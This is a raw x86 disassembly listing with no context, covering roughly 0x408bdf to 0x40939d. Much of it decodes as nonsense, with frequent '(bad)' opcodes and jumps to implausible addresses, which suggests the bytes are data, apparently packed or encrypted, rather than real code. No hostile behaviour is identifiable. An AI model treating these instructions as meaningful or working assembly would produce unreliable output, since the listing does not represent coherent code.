  408bdf:	cld    
  408be0:	inc    eax
  408be1:	pop    edx
  408be2:	mov    ds:0x7108e909,eax
  408be7:	cli    
  408be8:	arpl   WORD PTR [ebp+0x30],si
  408beb:	or     ecx,ebp
  408bed:	cmp    al,0xec
  408bef:	xor    cl,ch
  408bf1:	add    esi,DWORD PTR [ecx]
  408bf3:	or     DWORD PTR [esi],ebp
  408bf5:	mov    esi,0x3e62a22
  408bfa:	add    BYTE PTR [ecx],dh
  408bfc:	lahf   
  408bfd:	call   0xe8e0a2ab
  408c02:	test   eax,0x382c7d0e
  408c07:	popa   
  408c08:	jl     0x408c6e
  408c0a:	cmp    BYTE PTR [esi],al
  408c0c:	sub    dl,dh
  408c0e:	aam    0xf7
  408c10:	mov    bl,0xd0
  408c12:	xor    esp,DWORD PTR [ebp+ebp*1-0x2f]
  408c16:	pop    edi
  408c17:	ret    
  408c18:	or     cl,ch
  408c1a:	(bad)  
  408c1b:	sahf   
  408c1c:	mov    ah,0xeb
  408c1e:	sbb    al,0xb0
  408c20:	pop    es
  408c21:	jmp    0x319be529
  408c26:	vcvtsi2ss xmm2,xmm7,DWORD PTR [esp+edx*1]
  408c2b:	leave  
  408c2c:	sub    al,0x40
  408c2e:	xor    esi,DWORD PTR [esi-0x43ab9e28]
  408c34:	cmp    DWORD PTR [ebp+0x3b],0xffffffa6
  408c38:	sub    DWORD PTR [ecx],ebx
  408c3a:	(bad)  
  408c3b:	xchg   esi,eax
  408c3c:	sbb    al,0x0
  408c3e:	inc    eax
  408c3f:	bound  ebp,QWORD PTR [edx]
  408c41:	mov    DWORD PTR [ebp+eax*2+0x32],esp
  408c45:	jmp    DWORD PTR [esi+0x25]
  408c48:	(bad)  
  408c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c4a:	pop    esi
  408c4b:	inc    edx
  408c4c:	lahf   
  408c4d:	inc    eax
  408c4f:	out    0xce,al
  408c51:	inc    eax
  408c52:	jmp    0x3f31007a
  408c57:	and    ch,BYTE PTR [edx]
  408c59:	push   DWORD PTR [esi+ebx*2+0x804521]
  408c60:	and    ch,BYTE PTR [edx]
  408c62:	mov    DWORD PTR [ecx+ebx*1+0x32],esp
  408c66:	jmp    DWORD PTR [esi]
  408c68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c69:	sub    DWORD PTR [edi+0x11],esp
  408c6c:	outs   dx,DWORD PTR ds:[esi]
  408c6d:	enter  0x15ff,0xb8
  408c71:	cmp    bh,dh
  408c73:	push   cs
  408c74:	bound  ebp,QWORD PTR [eax]
  408c76:	jne    0x408c6d
  408c78:	dec    edx
  408c79:	repz test al,0xfe
  408c7c:	arpl   WORD PTR [edx+0x285a0985],dx
  408c82:	inc    DWORD PTR [ebx+0x43c5b132]
  408c88:	in     al,dx
  408c89:	sub    dh,bh
  408c8b:	xchg   esp,eax
  408c8c:	inc    edx
  408c8d:	and    bh,bh
  408c8f:	(bad)  
  408c90:	inc    ebx
  408c91:	sahf   
  408c92:	or     eax,ecx
  408c94:	xor    esi,DWORD PTR [edx-0x1]
  408c97:	(bad)  
  408c98:	gs mov gs,esp
  408c9b:	mov    dh,0x23
  408c9d:	sub    BYTE PTR [edx-0x17],ch
  408ca0:	mov    edx,0x35285a58
  408ca5:	sub    BYTE PTR [ebp-0xd7f467],dh
  408cab:	sahf   
  408cac:	jns    0x408cc2
  408cae:	call   0xff68e750
  408cb3:	pusha  
  408cb4:	mov    ecx,0xaf00f731
  408cb9:	fld    TBYTE PTR [ecx+0x0]
  408cbc:	inc    eax
  408cbd:	loop   0x408d18
  408cbf:	inc    ecx
  408cc0:	mov    bl,bl
  408cc2:	mov    ah,0xf0
  408cc4:	add    BYTE PTR [edi],al
  408cc6:	(bad)  
  408cc8:	jmp    DWORD PTR [ebp+0x28]
  408ccb:	out    0xd9,eax
  408ccd:	mov    al,ds:0x589fedb
  408cd2:	fdiv   st,st(6)
  408cd4:	(bad)  
  408cd5:	dec    DWORD PTR [esi-0x24d81b43]
  408cdb:	inc    BYTE PTR [eax]
  408cdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cde:	and    eax,0xe2e8bd82
  408ce3:	(bad)  
  408ce4:	call   FWORD PTR [eax+0x60]
  408ce7:	fs or  ebp,0x7
  408ceb:	idiv   edi
  408ced:	pop    ds
  408cee:	or     al,0x74
  408cf0:	pop    esp
  408cf1:	retf   
  408cf2:	cwde   
  408cf3:	out    0xf7,eax
  408cf5:	aas    
  408cf6:	(bad)  
  408cf8:	jae    0x408cc5
  408cfa:	cmp    edi,0xffffffff
  408cfd:	das    
  408cfe:	call   0xa23b:0x41075fe
  408d05:	pop    ds
  408d06:	(bad)  
  408d08:	mov    ch,0xdc
  408d0a:	loope  0x408d0a
  408d0c:	(bad)  
  408d0d:	fistp  WORD PTR [edi+0x7]
  408d10:	call   0x3f3ca4
  408d15:	call   FWORD PTR [edi-0x26100819]
  408d1b:	(bad)  
  408d1c:	jne    0x408cfe
  408d1e:	add    eax,DWORD PTR [ecx-0x126605e]
  408d24:	mov    ch,0xf4
  408d26:	loope  0x408d26
  408d28:	inc    DWORD PTR [eax]
  408d2a:	(bad)  
  408d2b:	pop    edi
  408d2c:	pop    es
  408d2d:	call   0x3f3c4d
  408d32:	xor    DWORD PTR [edi+0x77],edi
  408d35:	loopne 0x408cdd
  408d37:	xchg   esi,eax
  408d38:	xor    edi,edi
  408d3a:	sbb    al,0x1a
  408d3c:	sbb    esp,DWORD PTR [ebp-0x2d]
  408d3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d40:	xor    bh,bh
  408d42:	fdivr  QWORD PTR [ebp+0x39]
  408d45:	dec    DWORD PTR [esi-0x66f8494a]
  408d4b:	data16 gs (bad) 
  408d4e:	jle    0x408d16
  408d50:	jbe    0x408d36
  408d52:	jle    0x408d12
  408d54:	xor    al,ch
  408d56:	sub    BYTE PTR [ebp-0x5b9900cf],cl
  408d5c:	and    esi,edi
  408d5e:	pop    esi
  408d5f:	out    0x1b,al
  408d61:	cs mov esi,ds
  408d64:	xor    bh,bh
  408d66:	test   ch,ah
  408d68:	cmp    bh,bh
  408d6a:	inc    esi
  408d6b:	stc    
  408d6c:	in     al,0xa4
  408d6e:	ds push es
  408d70:	xor    DWORD PTR [ebp-0xcef9b7],esi
  408d76:	sbb    DWORD PTR [ecx],ebx
  408d78:	jmp    WORD PTR [esi]
  408d7b:	adc    BYTE PTR [edi-0x24],dh
  408d7e:	sub    BYTE PTR es:[eax],dh
  408d81:	call   0xff7162aa
  408d86:	push   cs
  408d87:	fidiv  WORD PTR [ebx]
  408d89:	test   DWORD PTR [esi],0x753030
  408d8f:	sub    eax,0x907b647
  408d94:	(bad)  
  408d95:	xor    edi,edi
  408d97:	out    dx,al
  408d98:	push   edi
  408d99:	jbe    0x408d8b
  408d9b:	fimul  WORD PTR [edi+0x30]
  408d9e:	call   0xff711a83
  408da3:	(bad)  
  408da4:	cmc    
  408da5:	sub    ebp,ecx
  408da7:	pusha  
  408da8:	jbe    0x408dda
  408daa:	inc    esi
  408dac:	or     DWORD PTR [eax+esi*1],ebx
  408daf:	leave  
  408db0:	adc    al,0x78
  408db2:	add    esi,DWORD PTR [ecx]
  408db4:	push   eax
  408db5:	stos   DWORD PTR es:[edi],eax
  408db6:	jmp    FWORD PTR [esi-0x4de09e43]
  408dbc:	dec    ebp
  408dbd:	test   DWORD PTR [ebp+0x30d5b09e],ebx
  408dc3:	sbb    al,0x11
  408dc5:	add    DWORD PTR [ebx+edx*8],0xec7a6e26
  408dcc:	and    al,0xd1
  408dce:	add    eax,0x30e8c7da
  408dd3:	cmp    al,0x3b
  408dd5:	mov    eax,ds:0xd4276ec2
  408dda:	sti    
  408ddb:	dec    esi
  408ddc:	pop    ds
  408ddd:	inc    esp
  408dde:	xor    BYTE PTR [esi-0x4f],bl
  408de1:	jmp    0x3105:0xc108f1cc
  408de8:	or     DWORD PTR [ecx+0x30],ebp
  408deb:	mov    esp,0x3c271110
  408df0:	es push ds
  408df2:	xor    BYTE PTR [eax],al
  408df4:	mov    esp,0x36b61624
  408df9:	xor    edi,esi
  408dfb:	gs es xor BYTE PTR es:[ebp+0x35],al
  408e01:	or     DWORD PTR [esp+edi*2+0x1f2d8805],edx
  408e08:	push   es
  408e09:	es out dx,al
  408e0b:	jge    0x408e79
  408e0d:	and    eax,0xf9842f39
  408e12:	fnstsw WORD PTR [ecx-0x6b78ced6]
  408e18:	xor    DWORD PTR [ecx],ecx
  408e1a:	loop   0x408e5f
  408e1c:	mov    WORD PTR ss:[esi+0x4],?
  408e20:	xor    DWORD PTR [ecx],ecx
  408e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e23:	leave  
  408e24:	fimul  WORD PTR [eax]
  408e26:	add    cl,ch
  408e28:	xor    cl,BYTE PTR [ecx]
  408e2a:	(bad)  
  408e2b:	and    al,0x9
  408e2d:	es pop es
  408e2f:	jmp    0x13404166
  408e34:	sub    eax,0x3502ffb3
  408e39:	xchg   esp,eax
  408e3a:	inc    ebp
  408e3b:	xchg   ebp,eax
  408e3c:	jge    0x408dd2
  408e3e:	test   DWORD PTR [ebp+0x66],edi
  408e41:	call   FWORD PTR es:[ecx]
  408e44:	inc    esi
  408e45:	pushf  
  408e46:	div    DWORD PTR [esi-0x38]
  408e49:	and    eax,ebp
  408e4b:	dec    edi
  408e4c:	popf   
  408e4d:	or     BYTE PTR [eax],al
  408e4f:	repnz repnz pushf 
  408e52:	add    DWORD PTR [edx+0x58],edx
  408e55:	xchg   esp,eax
  408e56:	test   DWORD PTR [ebp+0x0],eax
  408e59:	es es (bad) 
  408e5c:	mov    ecx,0x3ef48bb1
  408e61:	push   cs
  408e62:	es push eax
  408e64:	ds cwde 
  408e66:	adc    eax,0x2d4ebcff
  408e6b:	inc    ecx
  408e6c:	xchg   BYTE PTR [esi],dl
  408e6e:	mov    DWORD PTR es:[ebp+eax*1+0x1e],ebp
  408e73:	call   FWORD PTR [esi]
  408e75:	cmp    ah,BYTE PTR [ebp+0x74]
  408e78:	retf   
  408e79:	mov    bl,0x66
  408e7b:	in     al,dx
  408e7c:	push   ss
  408e7d:	push   esi
  408e7e:	and    al,0x0
  408e80:	jge    0x408eaf
  408e82:	mov    cl,0xff
  408e84:	call   0x3d3ff1c0
  408e89:	push   ecx
  408e8a:	sbb    al,0xff
  408e8c:	out    dx,al
  408e8d:	push   edi
  408e8e:	pop    esi
  408e8f:	lock fimul WORD PTR [edi+0x24]
  408e93:	call   DWORD PTR [ebp+esi*8+0x2c]
  408e97:	mov    ch,0xa0
  408e99:	pop    ds
  408e9a:	and    al,0xff
  408e9c:	xchg   esp,eax
  408e9d:	and    bl,BYTE PTR [edi+edi*8]
  408ea0:	add    bh,dh
  408ea2:	add    dl,dh
  408ea4:	mov    ds:0x45fef397,eax
  408ea9:	cmp    bh,0x7f
  408eac:	(bad)  
  408ead:	std    
  408eae:	fsub   st,st(7)
  408eb0:	adc    DWORD PTR [eax],edi
  408eb2:	or     BYTE PTR [eax],al
  408eb4:	leave  
  408eb5:	mov    ah,BYTE PTR [edi+edi*8]
  408eb8:	push   esp
  408eb9:	adc    eax,DWORD PTR [ebx+eax*4]
  408ebc:	les    eax,FWORD PTR [eax]
  408ebe:	mov    ah,0x82
  408ec0:	jmp    FWORD PTR [ecx-0x70]
  408ec3:	repz je 0x408ece
  408ec6:	ror    BYTE PTR [ebx],0xa1
  408ec9:	inc    DWORD PTR [edi]
  408ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ecc:	inc    esp
  408ecd:	cld    
  408ece:	xor    BYTE PTR [edx+ebx*2],ch
  408ed1:	inc    ecx
  408ed2:	mov    bl,dh
  408ed4:	xor    al,0xd2
  408ed6:	ror    BYTE PTR [ebp-0x1],0xfe
  408eda:	lea    esp,[eax]
  408edc:	out    0x25,eax
  408ede:	div    edx
  408ee0:	(bad)  
  408ee1:	push   0x40502f
  408ee6:	or     BYTE PTR [edx],0x0
  408ee9:	add    al,bl
  408eeb:	bnd je 0x408ef6
  408eee:	lock idiv dh
  408ef1:	call   DWORD PTR [edi]
  408ef3:	cmp    BYTE PTR [edi],0x5b
  408ef6:	mov    DWORD PTR [eax],ecx
  408ef8:	push   DWORD PTR ds:0x40606a
  408efe:	aaa    
  408eff:	popa   
  408f00:	pop    es
  408f01:	call   0x3f820e
  408f06:	rol    BYTE PTR [edi+0x5a],0x41
  408f0a:	sbb    BYTE PTR [eax-0x77e7ffff],al
  408f10:	push   DWORD PTR [ebp+0x0]
  408f13:	add    dh,ch
  408f15:	(bad)  
  408f16:	xlat   BYTE PTR ds:[ebx]
  408f17:	cmc    
  408f18:	(bad)  
  408f19:	jne    0x408f4c
  408f1b:	ds sub eax,0x374a3975
  408f21:	mov    al,ds:0x3b4ade00
  408f26:	ret    0x322d
  408f29:	(bad)  
  408f2a:	mov    bl,ch
  408f2c:	pop    edx
  408f2d:	mov    bh,0xb
  408f2f:	fnstenv [ecx+0x65]
  408f32:	(bad)  
  408f33:	mov    esi,0x67744316
  408f38:	cli    
  408f39:	stos   BYTE PTR es:[edi],al
  408f3a:	pop    edx
  408f3b:	lock xor ebx,edx
  408f3e:	out    0xf5,eax
  408f40:	retf   0xff2c
  408f43:	add    DWORD PTR [edx],eax
  408f45:	aam    0x67
  408f47:	xor    DWORD PTR [edx],esi
  408f49:	sbb    al,0xbe
  408f4b:	sbb    DWORD PTR [edi],ecx
  408f4d:	leave  
  408f4e:	inc    eax
  408f4f:	xor    DWORD PTR [edx],eax
  408f51:	sub    eax,0xf6ba2975
  408f56:	retf   
  408f57:	jbe    0x408f1b
  408f59:	retf   
  408f5a:	xor    BYTE PTR [bp+si],dh
  408f5d:	sbb    al,0xbe
  408f5f:	(bad)  [ecx-0x38]
  408f62:	inc    eax
  408f63:	xor    DWORD PTR [edx-0x45d68ad4],eax
  408f69:	loop   0x408f36
  408f6b:	dec    esi
  408f6c:	fcmove st,st(3)
  408f6e:	xor    esi,DWORD PTR [bp+si]
  408f71:	sbb    al,0xbe
  408f73:	leave  
  408f74:	jl     0x408f3e
  408f76:	inc    eax
  408f77:	xor    DWORD PTR [edx+0x2c],esp
  408f7a:	jne    0x408fb5
  408f7c:	or     bh,bh
  408f7e:	retf   
  408f7f:	es adc al,0x1c
  408f82:	push   ss
  408f83:	ror    BYTE PTR [ebx],cl
  408f85:	sub    eax,0x18f300c9
  408f8a:	add    edx,DWORD PTR [ebp-0x46]
  408f8d:	or     al,0x81
  408f8f:	les    eax,FWORD PTR ds:0x186a0387
  408f95:	or     esi,esp
  408f97:	mov    dh,0x2e
  408f99:	xor    DWORD PTR [ecx],esp
  408f9b:	fs out dx,al
  408f9d:	and    ah,BYTE PTR [eax-0x3a]
  408fa0:	jmp    0xd111:0x642cf2af
  408fa7:	adc    esi,0x22
  408faa:	mov    esi,0x3c221399
  408faf:	cld    
  408fb0:	into   
  408fb1:	fwait
  408fb2:	lods   eax,DWORD PTR ds:[esi]
  408fb3:	sub    al,0xbe
  408fb5:	scas   eax,DWORD PTR es:[edi]
  408fb6:	add    al,0x2d
  408fb8:	cmp    al,0x11
  408fba:	xchg   ecx,eax
  408fbb:	lahf   
  408fbc:	scas   eax,DWORD PTR es:[edi]
  408fbd:	and    dl,BYTE PTR [esi-0x71dae3d4]
  408fc3:	mov    dh,0x36
  408fc5:	xor    DWORD PTR [ebx],ebx
  408fc7:	fs xchg esi,eax
  408fc9:	and    dh,BYTE PTR [eax+0x1c093541]
  408fcf:	jns    0x408f66
  408fd1:	xchg   BYTE PTR [ebp-0xb6381d1],ah
  408fd7:	sbb    ebx,DWORD PTR [ebx]
  408fd9:	push   0x5e
  408fdb:	sub    al,0x3a
  408fdd:	dec    ecx
  408fde:	out    0x87,al
  408fe0:	xchg   edx,eax
  408fe1:	or     ecx,ebp
  408fe3:	add    ebp,DWORD PTR [eax-0x2b7fbb34]
  408fe9:	clc    
  408fea:	call   0x227c90a6
  408fef:	mov    esp,0x2c9c4613
  408ff4:	sbb    ebx,DWORD PTR [eax-0x57d3d995]
  408ffa:	int3   
  408ffb:	sbb    al,0x9b
  408ffd:	ret    0xa7bd
  409000:	add    esp,DWORD PTR [esi]
  409002:	pushf  
  409003:	or     al,0x1b
  409005:	imul   eax,DWORD PTR fs:[esi],0x2c
  409009:	xor    DWORD PTR [ecx+0x631e03e8],0x9c559900
  409013:	pop    es
  409014:	add    DWORD PTR [esi+0x15e6ff50],esp
  40901a:	xchg   DWORD PTR [edx-0x3e4ee522],esp
  409020:	xor    ch,ah
  409022:	and    esi,edi
  409024:	push   esp
  409025:	or     DWORD PTR [ecx],esi
  409027:	adc    al,0x8f
  409029:	or     ah,BYTE PTR [edx]
  40902b:	push   eax
  40902c:	push   ecx
  40902d:	xor    al,0x9
  40902f:	out    dx,eax
  409030:	ja     0x40900f
  409032:	and    dh,BYTE PTR [ebp-0x1f]
  409035:	sbb    dl,BYTE PTR [esi+0x310aa6c7]
  40903b:	popa   
  40903c:	dec    ebx
  40903d:	pop    edx
  40903e:	and    ch,BYTE PTR [eax+0x41]
  409041:	jbe    0x40900b
  409043:	dec    DWORD PTR [ebp+0x7ae81de0]
  409049:	adc    BYTE PTR [edx],ah
  40904b:	call   FWORD PTR [ecx]
  40904d:	lods   eax,DWORD PTR ds:[esi]
  40904e:	and    edi,edi
  409050:	xchg   BYTE PTR [eax],al
  409052:	sbb    edi,DWORD PTR [ecx+0x297af4fe]
  409058:	push   edx
  409059:	xor    DWORD PTR [edx+0x22],ecx
  40905c:	call   0xff62650a
  409061:	shl    ebp,0xbd
  409064:	inc    eax
  409065:	jmp    0x523c2c75
  40906a:	jmp    FWORD PTR [ebx-0x1]
  40906d:	ds gs test eax,0x632be900
  409074:	push   eax
  409075:	or     BYTE PTR cs:[ecx],0xe8
  409079:	fdivr  st,st(2)
  40907b:	and    edi,edi
  40907d:	adc    DWORD PTR [edx],edi
  40907f:	imul   edi,edi,0x16
  409082:	pop    edx
  409083:	xchg   esi,eax
  409084:	sti    
  409085:	add    DWORD PTR [edx+0x6b],eax
  409088:	inc    DWORD PTR [eax]
  40908a:	das    
  40908b:	faddp  st(1),st
  40908d:	or     al,0x18
  40908f:	cmp    cl,BYTE PTR [edx-0x4366414]
  409095:	push   0x8
  409097:	jg     0x4090b2
  409099:	call   DWORD PTR [ebp+0x1d]
  40909c:	out    0x39,eax
  40909e:	outs   dx,DWORD PTR ds:[esi]
  40909f:	repz dec BYTE PTR [ecx+0x69f115]
  4090a6:	jb     0x4090b7
  4090a8:	push   DWORD PTR [ebp-0x20]
  4090ab:	add    al,0x22
  4090ad:	dec    DWORD PTR [edi+0x720069f3]
  4090b3:	sub    dh,bh
  4090b5:	jne    0x4090b7
  4090b7:	rol    BYTE PTR [esi+edx*1],1
  4090ba:	dec    DWORD PTR [edi+0x420069f3]
  4090c0:	adc    edi,edi
  4090c2:	jne    0x409054
  4090c4:	add    al,0xa
  4090c6:	jmp    FWORD PTR [edi+0x53f667f3]
  4090cc:	inc    esi
  4090cd:	jmp    FWORD PTR [ecx-0x6e]
  4090d0:	repz je 0x4090db
  4090d3:	mov    al,0xef
  4090d5:	std    
  4090d6:	dec    DWORD PTR [edi]
  4090d8:	test   ch,dh
  4090da:	pop    ebx
  4090db:	leave  
  4090dc:	or     al,0x6a
  4090de:	and    ecx,DWORD PTR [edi]
  4090e0:	pop    ecx
  4090e1:	pop    es
  4090e2:	call   0x3f82d3
  4090e7:	jo     0x4090c3
  4090e9:	pop    edx
  4090ea:	inc    ecx
  4090eb:	dec    eax
  4090ec:	jle    0x409109
  4090ee:	inc    DWORD PTR [ebp-0x12218dc]
  4090f4:	repnz (bad) 
  4090f6:	inc    DWORD PTR [ebp+0x4075fee8]
  4090fc:	add    al,0x20
  4090fe:	lahf   
  4090ff:	dec    edi
  409100:	repz enter 0x31c2,0x2e
  409105:	add    edx,DWORD PTR [ebp-0x56]
  409108:	sbb    eax,0x1f09c483
  40910d:	sub    edi,edi
  40910f:	mov    esp,0x6502764
  409114:	popf   
  409115:	adc    bh,bh
  409117:	test   BYTE PTR [esi],bh
  409119:	sbb    edi,DWORD PTR [eax+0x331a400]
  40911f:	or     esi,ecx
  409121:	cs jle 0x40916b
  409124:	xor    BYTE PTR [edx],dh
  409126:	add    eax,edi
  409128:	je     0x409164
  40912a:	add    al,0x0
  40912c:	xor    DWORD PTR [edx],esi
  40912e:	inc    eax
  40912f:	inc    ebp
  409130:	lds    ebx,FWORD PTR [esi+0x1]
  409133:	add    BYTE PTR [ecx],dh
  409135:	int3   
  409136:	add    ebp,DWORD PTR [edx+0x31]
  409139:	int3   
  40913a:	add    ebp,DWORD PTR [edx+0x31]
  40913d:	xchg   ebp,eax
  40913e:	mov    esi,0x7ead01f3
  409143:	hlt    
  409144:	sahf   
  409145:	jbe    0x409170
  409147:	push   eax
  409148:	sahf   
  409149:	hlt    
  40914a:	sub    edi,edi
  40914c:	sbb    al,0x86
  40914e:	sbb    al,0x8a
  409150:	mov    esp,0x710b0331
  409155:	sbb    eax,0x312be8fe
  40915a:	add    eax,DWORD PTR [eax]
  40915c:	or     DWORD PTR [eax-0x44],edi
  40915f:	inc    eax
  409160:	xor    DWORD PTR [edi-0x25a6f052],edi
  409166:	pop    edi
  409167:	call   FWORD PTR [esi+0x61]
  40916a:	jl     0x40913c
  40916c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40916d:	lods   al,BYTE PTR ds:[esi]
  40916e:	das    
  40916f:	test   DWORD PTR [esi-0x22],0xea5951d3
  409176:	pop    edi
  409177:	(bad)  
  409178:	ds test al,0x7e
  40917b:	lock or BYTE PTR ds:[esi],ah
  40917f:	sub    DWORD PTR [eax],eax
  409181:	sbb    ecx,ebp
  409183:	inc    edi
  409184:	sub    DWORD PTR [esi],esp
  409186:	mov    ah,0xe8
  409188:	fwait
  409189:	test   DWORD PTR [ebp+0x551603a7],edi
  40918f:	stc    
  409190:	xor    BYTE PTR [esi],cl
  409192:	pop    ds
  409193:	(bad)  
  409194:	scas   al,BYTE PTR es:[edi]
  409195:	cmp    dh,BYTE PTR [ecx]
  409197:	int    0x5f
  409199:	(bad)  
  40919a:	push   ds
  40919b:	pusha  
  40919c:	jg     0x4091a3
  40919e:	pop    ss
  40919f:	out    0x28,al
  4091a1:	pop    ebx
  4091a2:	or     DWORD PTR [ecx-0x5d],edx
  4091a5:	mov    cl,al
  4091a7:	call   0xd65a35d4
  4091ac:	sub    dh,dl
  4091ae:	push   ds
  4091af:	cmp    al,0xf8
  4091b1:	(bad)  
  4091b2:	adc    BYTE PTR [ebp+0x6c90c628],al
  4091b8:	sbb    eax,esi
  4091ba:	push   ds
  4091bb:	scas   al,BYTE PTR es:[edi]
  4091bc:	test   BYTE PTR [ebp+ebp*1-0x62],dh
  4091c0:	sub    BYTE PTR [esi+0xef41509],ch
  4091c6:	or     ecx,ebp
  4091c8:	sbb    bh,bl
  4091ca:	mov    cl,0xeb
  4091cc:	(bad)  
  4091cd:	icebp  
  4091ce:	or     BYTE PTR [esi+0x7e169d6e],al
  4091d4:	sub    BYTE PTR [esi-0x42e41f6c],al
  4091da:	push   eax
  4091db:	outs   dx,BYTE PTR ds:[esi]
  4091dc:	sub    BYTE PTR [ecx],cl
  4091de:	or     cl,ch
  4091e0:	sbb    BYTE PTR [edi+0xc805b1],ch
  4091e6:	icebp  
  4091e7:	or     BYTE PTR [esi+0x6e],dl
  4091ea:	dec    ebp
  4091eb:	push   ss
  4091ec:	dec    esi
  4091ed:	sub    BYTE PTR [esi-0x6c],dl
  4091f0:	lock sbb edx,DWORD PTR [ebp-0x4dd7c1b0]
  4091f7:	pop    esp
  4091f8:	add    BYTE PTR [ecx+0x1],al
  4091fb:	push   ds
  4091fc:	(bad)  
  4091fd:	jmp    0xe9a88088
  409202:	xor    ch,BYTE PTR [esi]
  409204:	mov    esi,0x40bd2f91
  409209:	jmp    0x1728e657
  40920e:	dec    ecx
  40920f:	push   ds
  409210:	(bad)  
  409211:	jl     0x40921d
  409213:	xor    DWORD PTR es:[eax],0x59
  409217:	push   ds
  409218:	push   0xbe2e32e8
  40921d:	adc    DWORD PTR [ecx],0x17e940c2
  409223:	push   esp
  409224:	call   0xff5ea0ff
  409229:	pop    esp
  40922a:	frstor ds:0x1e0ea06b
  409230:	(bad)  
  409231:	jl     0x40925c
  409233:	push   ss
  409234:	(bad)  
  409235:	mov    esi,0xb69faf25
  40923a:	push   ss
  40923b:	push   ds
  40923c:	mov    ch,0xc1
  40923e:	push   es
  40923f:	push   ds
  409240:	call   DWORD PTR [ecx-0x6100822e]
  409246:	dec    esi
  409247:	push   esp
  409248:	lock sahf 
  40924a:	add    BYTE PTR [esi+0x1e],dl
  40924d:	call   DWORD PTR [ecx+ebx*4]
  409250:	push   ds
  409251:	jne    0x409244
  409253:	sub    dl,BYTE PTR [ebp-0x2]
  409256:	jle    0x4092a6
  409258:	push   ds
  409259:	mov    ch,0x79
  40925b:	dec    esi
  40925c:	push   ds
  40925d:	inc    DWORD PTR [ecx+0x66ff7db6]
  409263:	push   ss
  409264:	(bad)  
  409265:	not    DWORD PTR [eax+0x25]
  409268:	pop    ds
  409269:	call   DWORD PTR [esi+0x16]
  40926c:	xchg   esp,eax
  40926d:	sti    
  40926e:	inc    ecx
  40926f:	xchg   edx,eax
  409270:	xchg   ecx,eax
  409271:	add    BYTE PTR [eax],al
  409273:	pop    eax
  409274:	fadd   st(1),st
  409276:	or     al,0x58
  409278:	cmp    BYTE PTR [edx+0xb5807ec],cl
  40927e:	call   0x3f3b4b
  409283:	and    ecx,ecx
  409285:	jae    0x4092c0
  409287:	rcl    BYTE PTR ds:0x3908415b,0xe7
  40928e:	or     al,0x6c
  409290:	in     al,0xfe
  409292:	push   eax
  409293:	test   al,0x80
  409295:	(bad)  
  409296:	push   DWORD PTR [edi]
  409298:	mov    ds:0x45a41d67,eax
  40929d:	dec    DWORD PTR [edi+0x7]
  4092a0:	pop    edx
  4092a1:	pop    es
  4092a2:	call   0x3f73b5
  4092a7:	jo     0x409326
  4092a9:	add    BYTE PTR [eax],al
  4092ab:	mul    DWORD PTR [esi+0x4002767]
  4092b1:	inc    esi
  4092b2:	dec    DWORD PTR [edi-0x9]
  4092b5:	pop    ecx
  4092b6:	pop    es
  4092b7:	call   0x3f73b6
  4092bc:	lock call FWORD PTR [esi-0x3e227801]
  4092c3:	or     BYTE PTR [eax+0x1bec8a39],bl
  4092c9:	fdiv   st(3),st
  4092cb:	push   esi
  4092cc:	pop    edi
  4092cd:	jg     0x4092ce
  4092cf:	imul   esp,DWORD PTR [ebx-0x5ff78b1d],0x7ff9c1f
  4092d9:	popf   
  4092da:	inc    esp
  4092db:	cld    
  4092dc:	adc    ebx,DWORD PTR [ecx]
  4092de:	push   ebp
  4092df:	dec    eax
  4092e0:	dec    ecx
  4092e1:	add    eax,0x60723d8b
  4092e6:	inc    eax
  4092e7:	add    al,bl
  4092e9:	and    bh,bh
  4092eb:	push   cs
  4092ec:	xor    DWORD PTR [esi+0x32310069],ebp
  4092f2:	fwait
  4092f3:	adc    ebp,ebp
  4092f5:	jo     0x4092fa
  4092f7:	push   esi
  4092f8:	pop    ecx
  4092f9:	adc    al,0x77
  4092fb:	add    BYTE PTR [ecx],dh
  4092fd:	daa    
  4092fe:	inc    ebx
  4092ff:	je     0x4092e8
  409301:	jno    0x409286
  409303:	cmp    BYTE PTR [ecx],dh
  409305:	adc    edi,DWORD PTR [edi-0x79]
  409308:	xor    DWORD PTR [edx],esi
  40930a:	add    edx,DWORD PTR [eax-0x77]
  40930d:	and    bh,al
  40930f:	inc    eax
  409310:	xor    DWORD PTR [edx],ecx
  409312:	cwde   
  409313:	mov    DWORD PTR [eax],eax
  409315:	xor    DWORD PTR [edx],esi
  409317:	leave  
  409318:	add    dh,bl
  40931a:	sbb    DWORD PTR [ebx],0x2512c860
  409320:	push   eax
  409321:	popa   
  409322:	mov    al,BYTE PTR [ebx]
  409324:	add    dh,bl
  409326:	arpl   WORD PTR [esp+ebx*1+0x5003f185],bx
  40932d:	fidivr WORD PTR [ebx+edi*8+0x256a4ae7]
  409334:	jmp    FWORD PTR [ecx-0x46]
  409337:	add    al,BYTE PTR [eax]
  409339:	(bad)  
  40933a:	fwait
  40933b:	fwait
  40933c:	es pop ebp
  40933e:	icebp  
  40933f:	add    edx,DWORD PTR [eax-0x4a]
  409342:	aam    0xfb
  409344:	out    0x6,eax
  409346:	pop    edx
  409347:	and    eax,0x851199ff
  40934c:	call   FWORD PTR [esi+0x2b67c186]
  409352:	out    dx,al
  409353:	ret    0xe7ff
  409356:	jns    0x409395
  409358:	mov    esi,DWORD PTR [ecx]
  40935a:	xor    bh,al
  40935c:	mov    edi,0xe7cd5e05
  409361:	sbb    cl,cl
  409363:	and    al,0xff
  409365:	add    DWORD PTR [ecx],ecx
  409367:	mov    ecx,0x4e1b669b
  40936c:	leavew 
  40936e:	std    
  40936f:	mov    ah,0xc2
  409371:	push   esi
  409372:	retf   
  409373:	dec    ebp
  409374:	scas   eax,DWORD PTR es:[edi]
  409375:	xor    DWORD PTR ss:[edi],ecx
  409378:	cmp    al,0x0
  40937a:	inc    esi
  40937b:	sbb    esp,DWORD PTR [ecx+0x4609319b]
  409381:	leavew 
  409383:	jecxz  0x409311
  409385:	ret    0xcb2e
  409388:	and    eax,0xfb312eaf
  40938d:	cmp    ebx,DWORD PTR [esi]
  40938f:	sbb    eax,DWORD PTR [ecx]
  409391:	or     DWORD PTR [esi+0x30190e1a],esi
  409397:	ret    
  409398:	push   0x29606e6
  40939d:	mov    esi,0x6b28d6fa
